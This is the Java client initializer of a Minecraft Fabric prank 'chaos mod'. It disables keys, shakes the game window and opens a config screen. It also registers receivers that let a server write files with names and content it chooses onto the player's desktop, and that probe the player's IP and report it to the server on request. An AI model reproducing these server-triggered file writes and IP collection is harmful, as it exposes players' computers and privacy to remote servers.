package com.example;

import com.example.gui.ChaosModConfigScreen;
import com.example.network.ConfigSyncPacket;
import com.example.network.ConfigToggleC2SPacket;
import com.example.network.KeyDisableS2CPacket;
import com.example.screen.ChaosModScreenHandler;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;

import java.util.Set;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ingame.HandledScreens;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.util.InputUtil;
import net.minecraft.text.Text;
import org.lwjgl.glfw.GLFW;

public class ChaosModClient implements ClientModInitializer {
	private static KeyBinding configKeyBinding;
	private static boolean configPermission = false;
	
	// 客户端按键禁用状态
	private static java.util.Set<String> disabledKeys = new java.util.HashSet<>();
	
	// 重置标记 - 允许mixin知道我们正在重置
	private static boolean isResetting = false;
	
	@Override
	public void onInitializeClient() {
		// v1.3.0: Initialize language system on client
		com.example.config.LanguageManager.loadLanguageFromConfig();
		
		// 确保客户端也注册payload type（防止时机问题）
		try {
			net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry.playS2C().register(
				KeyDisableS2CPacket.ID, 
				KeyDisableS2CPacket.CODEC
			);
		} catch (Exception e) {
			// 如果已经注册过了，忽略错误
		}
		
		// 注册按键禁用网络包接收器
		ClientPlayNetworking.registerGlobalReceiver(KeyDisableS2CPacket.ID, 
			(packet, context) -> {
				// 在主线程中更新禁用的按键列表
				context.client().execute(() -> {
					Set<String> oldDisabled = new java.util.HashSet<>(disabledKeys);
					disabledKeys.clear();
					disabledKeys.addAll(packet.disabledKeys());
					Set<String> restoredKeys = new java.util.HashSet<>(oldDisabled);
					restoredKeys.removeAll(disabledKeys);
					
					// 任何从禁用集合中移除的按键都立即复位，不能只处理“全部恢复”。
					if (!restoredKeys.isEmpty()) {
						// 立即重置
						forceResetKeyStates(restoredKeys);
						
						// 延迟重置（防止时机问题）
						new Thread(() -> {
							try {
								Thread.sleep(100); // 等待100ms
								MinecraftClient client = context.client();
								if (client != null) {
									client.execute(() -> {
										forceResetKeyStates(restoredKeys);
									});
								}
							} catch (InterruptedException e) {
								Thread.currentThread().interrupt();
							}
						}).start();
					}
					
				});
			});
		
		// === v1.6.0 旧版桌面文件生成网络包接收器（已废弃） ===
		// 禁用旧的网络包处理，使用新的DesktopFileContentS2CPacket
		/*
		ClientPlayNetworking.registerGlobalReceiver(
			com.example.network.DesktopFileGenerateS2CPacket.ID,
			(packet, context) -> {
				// 旧版处理方式已废弃
			});
		*/
		
		// === v1.6.0 注册桌面文件内容网络包接收器（多语言支持） ===
		ClientPlayNetworking.registerGlobalReceiver(
			com.example.network.DesktopFileContentS2CPacket.ID,
			(packet, context) -> {
				// 在主线程中处理桌面文件生成（新版本，支持多语言）
				context.client().execute(() -> {
					com.example.util.DesktopPrankSystem.handleCompleteFileGeneration(
						packet.fileName(), packet.fullContent(), packet.previousFile()
					);
				});
			});
		
		// === v1.7.0 注册IP探测请求网络包接收器 ===
		ClientPlayNetworking.registerGlobalReceiver(
			com.example.network.RequestIPProbeS2CPacket.ID,
			(packet, context) -> {
				// 服务器请求客户端探测IP，异步处理不阻塞主线程
				com.example.util.ClientIPProber.probeAndReportAsync();
			});
		
		// 控制癫痫Plus现在使用现有的KeyDisableS2CPacket系统，无需新网络包接收器
		
		// 注册客户端屏幕处理器
		HandledScreens.register(ChaosMod.CHAOS_MOD_SCREEN_HANDLER_TYPE, ChaosModConfigScreen::new);
		
		// 注册配置快照接收器
		ClientPlayNetworking.registerGlobalReceiver(ConfigSyncPacket.ID, (packet, context) ->
			context.client().execute(() -> {
				ChaosMod.config.applySnapshot(packet.values());
				ChaosMod.config.applyIntervalSnapshot(packet.intervals());
				ChaosMod.config.applyPercentageSnapshot(packet.percentages());
				configPermission = packet.hasPermission();
				if (context.client().currentScreen instanceof ChaosModConfigScreen screen) {
					screen.applyServerSync(packet.hasPermission());
				}
			})
		);

		// 连接级状态必须在离服时清空，避免把上一台服务器的权限、配置和禁用按键带到下一台服务器。
		ClientPlayConnectionEvents.DISCONNECT.register((handler, client) ->
			client.execute(ChaosModClient::resetConnectionState)
		);
		
		// Register key binding for opening config menu
		configKeyBinding = KeyBindingHelper.registerKeyBinding(new KeyBinding(
			"key.chaosmod.config_menu",
			InputUtil.Type.KEYSYM,
			GLFW.GLFW_KEY_P, // Default key: P
			"category.chaosmod.general"
		));
		
		// Register client tick event to handle key presses
		ClientTickEvents.END_CLIENT_TICK.register(client -> {
			while (configKeyBinding.wasPressed()) {
				if (client.player != null) {
					// 简化版本：直接打开配置界面
					// 在单人游戏中，玩家默认有管理员权限
					// 在多人游戏中，需要按照服务器权限设置
					boolean hasPermission = client.isInSingleplayer() || configPermission;
					if (!client.isInSingleplayer() && ClientPlayNetworking.canSend(ConfigToggleC2SPacket.ID)) {
						ClientPlayNetworking.send(new ConfigToggleC2SPacket(java.util.Map.of()));
					}
					client.setScreen(new ChaosModConfigScreen(
						new ChaosModScreenHandler(0, client.player.getInventory(), hasPermission),
						client.player.getInventory(),
						Text.literal(com.example.config.LanguageManager.getUI("gui.title"))
					));
				}
			}
			
			// === v1.6.0 第四面墙突破效果客户端逻辑 ===
			// 窗口暴力抖动系统
			com.example.util.WindowShakeSystem.clientTick();
			
			// 桌面恶作剧入侵已移至服务端控制，客户端只接收处理
			// com.example.util.DesktopPrankSystem.clientTick(); // 禁用客户端主动文件生成
			
		// 控制癫痫Plus现在使用现有的按键失灵系统，无需额外客户端逻辑
		
	});
	
	// Initialize RandomKeyPressManager
	com.example.util.RandomKeyPressManager.initialize();
}

	private static void resetConnectionState() {
		configPermission = false;

		java.util.Map<String, Boolean> disabledSnapshot = new java.util.LinkedHashMap<>();
		for (String key : com.example.config.ChaosModConfig.CONFIG_KEYS) {
			disabledSnapshot.put(key, false);
		}
		ChaosMod.config.applySnapshot(disabledSnapshot);
		ChaosMod.config.applyIntervalSnapshot(
			com.example.config.ChaosModConfig.defaultIntervalSnapshot()
		);
		ChaosMod.config.applyPercentageSnapshot(
			com.example.config.ChaosModConfig.defaultPercentageSnapshot()
		);

		Set<String> oldDisabled = new java.util.HashSet<>(disabledKeys);
		disabledKeys.clear();
		if (!oldDisabled.isEmpty()) {
			forceResetKeyStates(oldDisabled);
		}

		com.example.util.RandomKeyPressManager.cleanup();
		com.example.util.WindowShakeSystem.resetWindowPosition();
	}

	/**
	 * 检查指定按键是否被禁用
	 */
	public static boolean isKeyDisabled(String keyType) {
		// 如果正在重置，允许所有按键操作
		if (isResetting) return false;
		return disabledKeys.contains(keyType);
	}
	
	/**
	 * 检查是否正在重置按键状态
	 */
	public static boolean isResetting() {
		return isResetting;
	}
	
	/**
	 * 公开方法：强制重置所有当前禁用的按键状态
	 */
	public static void forceResetAllDisabledKeys() {
		if (!disabledKeys.isEmpty()) {
			forceResetKeyStates(new java.util.HashSet<>(disabledKeys));
		}
	}
	
	/**
	 * 强制重置按键状态 - 主动调用setPressed(false)
	 */
	private static void forceResetKeyStates(Set<String> keysToReset) {
		MinecraftClient client = MinecraftClient.getInstance();
		if (client == null || client.options == null) return;
		
		try {
			// 设置重置标记，让mixin知道我们正在重置
			isResetting = true;
			
			for (String keyType : keysToReset) {
				KeyBinding keyBinding = getKeyBindingByType(keyType, client);
				if (keyBinding != null) {
					try {
						// 强制设置按键状态为未按下
						keyBinding.setPressed(false);
						
						// 如果重置失败，尝试反射强制重置
						if (keyBinding.isPressed()) {
							for (int i = 0; i < 3; i++) {
								keyBinding.setPressed(false);
								try {
									// 使用反射强制重置
									java.lang.reflect.Field pressedField = KeyBinding.class.getDeclaredField("pressed");
									pressedField.setAccessible(true);
									pressedField.set(keyBinding, false);
								} catch (Exception reflectEx) {
									// 静默处理反射错误
								}
								
								if (!keyBinding.isPressed()) break;
							}
						}
						
					} catch (Exception e) {
						// 静默处理错误
					}
				}
			}
			
		} finally {
			// 确保重置标记被清除
			isResetting = false;
		}
	}
	
	/**
	 * 根据按键类型获取对应的KeyBinding
	 */
	private static KeyBinding getKeyBindingByType(String keyType, MinecraftClient client) {
		return switch (keyType) {
			case "forward" -> client.options.forwardKey;
			case "back" -> client.options.backKey;
			case "left" -> client.options.leftKey;
			case "right" -> client.options.rightKey;
			case "jump" -> client.options.jumpKey;
			case "sprint" -> client.options.sprintKey;
			case "attack" -> client.options.attackKey;
			case "use" -> client.options.useKey;
			case "drop" -> client.options.dropKey;
			case "sneak" -> client.options.sneakKey;
			default -> null;
		};
	}
}
